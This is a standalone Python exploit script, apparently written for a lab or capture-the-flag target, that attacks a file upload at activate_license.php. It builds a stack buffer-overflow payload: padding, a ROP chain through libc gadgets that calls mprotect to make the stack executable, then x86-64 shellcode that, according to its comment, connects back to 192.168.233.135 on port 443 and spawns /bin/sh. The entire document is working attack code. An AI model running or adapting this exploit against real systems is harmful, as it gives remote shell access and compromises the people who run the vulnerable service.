#!/usr/bin/python3
from pwn import p64
import requests

offset = 520
junk = b"A" * offset

libc_base = 0x7ffff7b56000

stack_start = 0x7ffffffde000
stack_end = 0x7ffffffff000
stack_size = stack_end - stack_start

# connect(s, [2, 443, "192.168.233.135"], 16); execve("/bin/sh", NULL, NULL);
shellcode  = b""
shellcode += b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f"
shellcode += b"\x05\x97\x52\xc7\x44\x24\x04\xc0\xa8\xe9\x87"
shellcode += b"\x66\xc7\x44\x24\x02\x01\xbb\xc6\x04\x24\x02"
shellcode += b"\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x6a\x02\x5e"
shellcode += b"\xb0\x21\x0f\x05\xff\xce\x79\xf8\xb0\x3b\xff"
shellcode += b"\xc6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73"
shellcode += b"\x68\x57\x54\x5f\x99\x0f\x05"

payload =  b""
payload += junk
payload += p64(libc_base + 0x26796) # pop rdi; ret;
payload += p64(stack_start)         # addr
payload += p64(libc_base + 0x2890f) # pop rsi; ret;
payload += p64(stack_size)          # len
payload += p64(libc_base + 0xcb1cd) # pop rdx; ret;
payload += p64(0x7)                 # prot
payload += p64(libc_base + 0xf8c20) # mprotect()
payload += p64(libc_base + 0x27a5e) # call rsp;
payload += shellcode

requests.post("http://localhost/activate_license.php", files={"licensefile": payload})
